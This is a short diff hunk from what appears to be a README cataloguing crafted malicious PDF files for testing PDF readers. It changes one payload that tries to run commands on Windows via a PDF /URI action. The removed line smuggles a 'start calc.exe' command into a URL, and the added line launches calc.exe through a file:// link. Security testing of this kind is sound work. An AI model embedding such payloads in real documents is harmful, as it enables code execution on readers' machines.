@@ -39,7 +39,7 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 
 **Line 69**. Try to run remote commands on Windows.
 ```
-/URI (https://example.com/^& start C:/\Windows/\system32/\calc.exe)
+/URI (file:///C:/Windows/system32/calc.exe)
 ```
 
 ### payload4.pdf
